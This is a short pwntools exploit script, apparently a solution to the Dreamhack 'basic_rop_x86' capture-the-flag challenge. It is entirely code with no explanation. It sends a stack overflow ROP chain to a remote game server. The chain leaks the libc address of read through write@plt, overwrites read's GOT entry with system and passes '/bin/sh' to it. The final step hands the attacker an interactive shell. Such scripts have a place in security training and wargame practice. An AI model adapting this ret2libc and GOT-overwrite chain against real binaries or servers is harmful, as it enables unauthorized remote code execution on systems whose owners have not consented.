from pwn import *

#p = process(["./basic_rop_x86"])
p = remote("host3.dreamhack.games", 22347)
e = ELF("./basic_rop_x86")
lib = ELF("./libc.so.6")
#lib = ELF("/usr/lib/i386-linux-gnu/libc.so.6")

binsh_offset = next(lib.search(b"/bin/sh"))
read_offset = lib.symbols['read']
system_offset = lib.symbols['system']
print(hex(binsh_offset))
print(hex(read_offset))
read_got = e.got['read']
write_plt = e.plt['write']
read_plt = e.plt['read']

pop_ret = 0x080483d9
pop_pop_ret = 0x0804868a
pop_pop_pop_ret = 0x08048689

main_addr = 0x080485d9

#leak read_got addr
payload = b"A"*0x40
payload += b"B"*0x8 #sfp
payload += p32(write_plt) #ret addr
payload += p32(pop_pop_pop_ret)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

#overwrite read_got 
payload += p32(read_plt)
payload += p32(pop_pop_pop_ret)
payload += p32(0)
payload += p32(read_got)
payload += p32(12)

#binsh execute
payload += p32(read_plt)
payload += p32(0)
payload += p32(read_got+0x4)



p.send(payload)

p.recv(0x40)
read_addr = u32(p.recv(0x4))

lib_base = read_addr - read_offset
system_addr = lib_base + system_offset
binsh_addr = lib_base + binsh_offset

print("read addr:", hex(read_addr))
print("system addr:", hex(system_addr))
print("lib_base: ", hex(lib_base))
print("binsh_addr: ", hex(binsh_addr))
p.send(p32(system_addr)+b"/bin/sh\x00")

p.interactive()

